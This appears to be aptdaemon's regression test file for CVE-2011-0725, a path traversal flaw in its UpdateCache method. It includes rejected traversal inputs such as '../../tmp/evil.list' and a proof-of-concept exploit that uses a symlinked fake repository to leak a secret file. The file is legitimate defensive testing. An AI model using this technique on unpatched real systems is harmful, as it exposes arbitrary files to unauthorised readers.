#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2010 Michael Vogt <mvo@ubuntu.com>
#
# Licensed under the GNU General Public License Version 2
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
# Licensed under the GNU General Public License Version 2

"""Regression test for the security issue CVE-2011-0725 tracked
in LP #722228.

Thanks to Sergey Nizovtsev for spotting this issue.

The UpdateCache method allows to specify an alternative sources.list
snippet to only update the repositories specified in the corresponding
configuration file.

Aptdaemon did not restrict the path to the sources.list.d directory and
allowed to inject packages from malicious sources specified in a custom
sources.list and even to read every file on the system.
"""

__author__ = "Michael Vogt <mvo@glatzor.de>"

import os
import tempfile
import time
import unittest2

import apt_pkg
import dbus
import mock

import aptdaemon.client
import aptdaemon.test
from aptdaemon.worker import AptWorker
from aptdaemon.errors import AptDaemonError


class TestFix(unittest2.TestCase):

    """Test the fix."""

    def test_closed(self):
        worker = AptWorker()
        # We don't want to perform any cache changes
        worker._cache = mock.Mock()
        trans = mock.Mock()
        # ensure normal operation keeps working
        worker.update_cache(trans, None)
        self.assertTrue(worker._cache.update.called)
        worker._cache.reset_mock()
        worker.update_cache(trans, "foobar.list")
        self.assertTrue(worker._cache.update.called)
        worker._cache.reset_mock()
        worker.update_cache(trans, "/etc/apt/sources.list.d/foobar.list")
        self.assertTrue(worker._cache.update.called)
        worker._cache.reset_mock()
        worker.update_cache(trans, "/etc/apt/sources.list")
        self.assertTrue(worker._cache.update.called)

        # ensure absolute path is no longer working
        worker._cache.reset_mock()
        self.assertRaises(AptDaemonError, worker.update_cache, trans,
                          "/etc/fstab")
        self.assertFalse(worker._cache.update.called)
        worker._cache.reset_mock()
        self.assertRaises(AptDaemonError, worker.update_cache, trans,
                          "/tmp/etc/apt/sources.list.d")
        self.assertFalse(worker._cache.update.called)
        worker._cache.reset_mock()
        self.assertRaises(AptDaemonError, worker.update_cache, trans,
                          "/etc/apt/sources.list.d/../../tmp/evil.list")
        self.assertFalse(worker._cache.update.called)
        worker._cache.reset_mock()
        self.assertRaises(AptDaemonError, worker.update_cache, trans,
                          "../../../../../../../../../tmp/evil.list")
        self.assertFalse(worker._cache.update.called)


class TestExploit(aptdaemon.test.AptDaemonTestCase):

    """Test if the a possible exploit still exists."""

    def setUp(self):
        """Setup a chroot, run the aptdaemon and a fake PolicyKit daemon."""
        # Setup chroot
        self.chroot = aptdaemon.test.Chroot()
        self.chroot.setup()
        self.addCleanup(self.chroot.remove)
        # Start aptdaemon with the chroot on the session bus
        self.start_dbus_daemon()
        self.bus = dbus.bus.BusConnection(self.dbus_address)
        self.start_session_aptd(self.chroot.path)
        # Start the fake PolikcyKit daemon
        self.start_fake_polkitd()
        time.sleep(1)
        # Create a file which containts a virtual secret
        self.secrets_file = tempfile.NamedTemporaryFile(dir=self.chroot.path,
                                                        delete=False)
        self.secrets_file.write("Oh oh!")
        self.secrets_file.close()

    @unittest2.expectedFailure
    def test(self):
        """A possible exploit of the security issue.
        Originally provided by Sergey Nizovtsev.
        """
        repo_path = os.path.join(self.chroot.path, "repo")
        lst_path = os.path.join(self.chroot.path, "malicious.list")

        arch = apt_pkg.config["APT::Architecture"]

        # Setup a pseudo repository and link the file which should be extracted
        # to the Packages file
        dir = os.path.join(repo_path, "dists/a/a/binary-%s" % arch)
        os.makedirs(dir)
        os.symlink(self.secrets_file.name, "%s/Packages" % dir)
        # Create a malicious list file which injects the repo
        with open(lst_path, "w") as lst_file:
            lst_file.write("deb file://%s a a" % repo_path)

        client = aptdaemon.client.AptClient(self.bus)
        exit = client.update_cache(sources_list=lst_path, wait=True)
        self.assertEqual(exit, aptdaemon.enums.EXIT_SUCCESS)

        # Check if succeeded to leak the file content!
        repo_path_encoded = apt_pkg.uri_to_filename("file://%s" % repo_path)
        leaked_path = os.path.join(self.chroot.path, "var/lib/apt/lists/",
                                   "%s_dists_a_a_binary-%s_"
                                   "Packages" % (repo_path_encoded, arch))
        with open(leaked_path, "r") as leaked_file:
            self.assertEqual(leaked_file.read(), "Oh oh!")


if __name__ == "__main__":
    unittest2.main()

# vim: ts=4 et sts=4
